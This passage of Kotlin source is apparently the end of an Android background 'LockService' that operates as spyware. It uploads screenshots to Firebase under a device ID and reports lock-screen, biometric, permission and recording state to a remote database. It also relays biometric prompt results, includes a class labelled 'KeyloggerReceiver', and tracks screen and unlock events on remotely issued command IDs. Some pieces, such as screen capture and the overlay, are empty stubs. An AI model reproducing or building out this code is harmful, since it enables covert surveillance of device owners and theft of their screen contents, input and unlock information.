            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (e: Exception) {
            false
        }
    }

    private fun showUnlockPrompt() {
        try {
            if (hasOverlayPermission()) {
                // Create overlay to show unlock prompt
            }
        } catch (e: Exception) {
            Logger.error("Failed to show unlock prompt", e)
        }
    }

    private fun captureScreenshot(): Bitmap? {
        return try {
            // Implementation for screen capture
            null
        } catch (e: Exception) {
            Logger.error("Failed to capture screenshot", e)
            null
        }
    }

    private fun saveScreenCapture(bitmap: Bitmap, commandId: String) {
        try {
            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream)
            val imageData = outputStream.toByteArray()

            // Upload to Firebase Storage
            val screenshotRef = storage.child("screenshots/$deviceId/${commandId}_${System.currentTimeMillis()}.jpg")
            screenshotRef.putBytes(imageData)
                .addOnSuccessListener {
                    Logger.log("Screenshot uploaded to Firebase Storage")

                    val captureData = mapOf(
                        "timestamp" to System.currentTimeMillis(),
                        "commandId" to commandId,
                        "storagePath" to "screenshots/$deviceId/${commandId}_${System.currentTimeMillis()}.jpg",
                        "size" to imageData.size
                    )

                    db.child("Device").child(deviceId).child("screen_captures").push().setValue(captureData)
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to upload screenshot", e)
                }
        } catch (e: Exception) {
            Logger.error("Failed to save screen capture", e)
        }
    }

    private fun updateLockDetails(): Boolean {
        return try {
            val biometricManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                androidx.biometric.BiometricManager.from(this)
            } else null

            val biometricStatus = when (biometricManager?.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG)) {
                androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS -> "Available"
                androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -> "Not Available"
                androidx.biometric.BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE -> "Hardware Unavailable"
                androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -> "Not Enrolled"
                else -> "Unknown"
            }

            val lockDetails = mapOf(
                "connected" to true,
                "isDeviceSecure" to keyguardManager.isKeyguardSecure,
                "biometricStatus" to biometricStatus,
                "biometricType" to getBiometricType(),
                "isDeviceAdminActive" to isDeviceAdminActive(),
                "passwordQuality" to getPasswordQuality(),
                "lockScreenTimeout" to getLockScreenTimeout(),
                "keyguardFeatures" to getKeyguardFeatures(),
                "androidVersion" to Build.VERSION.SDK_INT,
                "manufacturer" to Build.MANUFACTURER,
                "model" to Build.MODEL,
                "serviceInitialized" to isServiceInitialized,
                "networkAvailable" to isNetworkAvailable(),
                "cameraAvailable" to isCameraAvailable(),
                "fingerprintAvailable" to isBiometricAvailable(),
                "overlayPermission" to hasOverlayPermission(),
                "cameraPermission" to hasCameraPermission(),
                "audioPermission" to hasAudioPermission(),
                "isRecording" to isRecording,
                "lastUpdate" to System.currentTimeMillis()
            )

            db.child("Device").child(deviceId).child("lock_details").setValue(lockDetails)
            lastStatusUpdate = System.currentTimeMillis()
            Logger.log("Lock details updated")
            true
        } catch (e: Exception) {
            Logger.error("Failed to update lock details", e)
            false
        }
    }

    private fun getBiometricType(): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val packageManager = packageManager
                when {
                    packageManager.hasSystemFeature(PackageManager.FEATURE_FINGERPRINT) -> "Fingerprint"
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && packageManager.hasSystemFeature(PackageManager.FEATURE_FACE) -> "Face"
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && packageManager.hasSystemFeature(PackageManager.FEATURE_IRIS) -> "Iris"
                    else -> "None"
                }
            } else {
                "None"
            }
        } catch (e: Exception) {
            "Unknown"
        }
    }

    private fun getPasswordQuality(): String {
        return try {
            if (isDeviceAdminActive()) {
                when (devicePolicyManager.getPasswordQuality(adminComponent)) {
                    DevicePolicyManager.PASSWORD_QUALITY_NUMERIC -> "Numeric"
                    DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX -> "Numeric Complex"
                    DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC -> "Alphabetic"
                    DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC -> "Alphanumeric"
                    DevicePolicyManager.PASSWORD_QUALITY_COMPLEX -> "Complex"
                    else -> "Unknown"
                }
            } else {
                "Not Available"
            }
        } catch (e: Exception) {
            "Error"
        }
    }

    private fun getLockScreenTimeout(): Long {
        return try {
            if (isDeviceAdminActive()) {
                devicePolicyManager.getMaximumTimeToLock(adminComponent)
            } else {
                -1L
            }
        } catch (e: Exception) {
            -1L
        }
    }

    private fun getKeyguardFeatures(): List<String> {
        return try {
            if (isDeviceAdminActive()) {
                val features = mutableListOf<String>()
                val disabledFeatures = devicePolicyManager.getKeyguardDisabledFeatures(adminComponent)

                if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_SECURE_CAMERA != 0) {
                    features.add("Camera Disabled")
                }
                if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_SECURE_NOTIFICATIONS != 0) {
                    features.add("Notifications Disabled")
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
                    disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT != 0) {
                    features.add("Fingerprint Disabled")
                }

                features
            } else {
                emptyList()
            }
        } catch (e: Exception) {
            emptyList()
        }
    }

    private fun updateServiceStatus(connected: Boolean) {
        try {
            db.child("Device").child(deviceId).child("lock_service").setValue(
                mapOf(
                    "connected" to connected,
                    "lastSeen" to System.currentTimeMillis(),
                    "version" to "2.0.0"
                )
            )
        } catch (e: Exception) {
            Logger.error("Failed to update service status", e)
        }
    }

    private fun updateCommandStatus(commandId: String, status: String, error: String?) {
        try {
            val updates = mutableMapOf<String, Any>(
                "status" to status,
                "timestamp" to System.currentTimeMillis()
            )
            if (error != null) {
                updates["error"] = error
            }

            db.child("Device").child(deviceId).child("deviceAdvice").updateChildren(updates)
        } catch (e: Exception) {
            Logger.error("Failed to update command status", e)
        }
    }

    // Keylogger Receiver
    private inner class KeyloggerReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            try {
                when (intent?.action) {
                    "android.intent.action.INPUT_METHOD_CHANGED" -> {
                        val inputMethod = Settings.Secure.getString(
                            contentResolver,
                            Settings.Secure.DEFAULT_INPUT_METHOD
                        )
                        if (inputMethod != null) {
                            logKeyboardActivity(inputMethod)
                        }
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error in keylogger receiver", e)
            }
        }
    }

    // Biometric Result Receiver
    private inner class BiometricResultReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                BiometricAuthActivity.ACTION_BIOMETRIC_RESULT -> {
                    val commandId = intent.getStringExtra(BiometricAuthActivity.EXTRA_COMMAND_ID)
                    val result = intent.getStringExtra(BiometricAuthActivity.EXTRA_RESULT)
                    val error = intent.getStringExtra(BiometricAuthActivity.EXTRA_ERROR)
                    val action = intent.getStringExtra(BiometricAuthActivity.EXTRA_ACTION)

                    if (commandId != null && result != null) {
                        commandResults[commandId] = result

                        if (result == BiometricAuthActivity.RESULT_SUCCESS && action != null) {
                            val biometricData = mapOf(
                                "action" to action,
                                "result" to result,
                                "timestamp" to System.currentTimeMillis(),
                                "commandId" to commandId
                            )
                            db.child("Device").child(deviceId).child("biometric_data").setValue(biometricData)
                        }

                        Logger.log("Biometric result received: $result for command: $commandId")
                    }
                }
                Intent.ACTION_SCREEN_ON -> {
                    Logger.log("Screen turned on")
                    scope.launch {
                        monitorUnlockAttempts("screen_on_${System.currentTimeMillis()}")
                    }
                }
                Intent.ACTION_SCREEN_OFF -> {
                    Logger.log("Screen turned off")
                }
                Intent.ACTION_USER_PRESENT -> {
                    Logger.log("User present (device unlocked)")
                    scope.launch {
                        monitorUnlockAttempts("user_present_${System.currentTimeMillis()}")
                    }
                }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }

            overlayView?.let {
                windowManager.removeView(it)
            }

            closeCamera()

            if (isRecording) {
                mediaRecorder?.apply {
                    stop()
                    release()
                }
                mediaRecorder = null
                isRecording = false
            }

            try {
                unregisterReceiver(biometricResultReceiver)
                unregisterReceiver(keyloggerReceiver)
            } catch (e: IllegalArgumentException) {
                // Receiver not registered
            }

            scope.cancel()
            updateServiceStatus(false)
            Logger.log("Enhanced LockService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying LockService", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}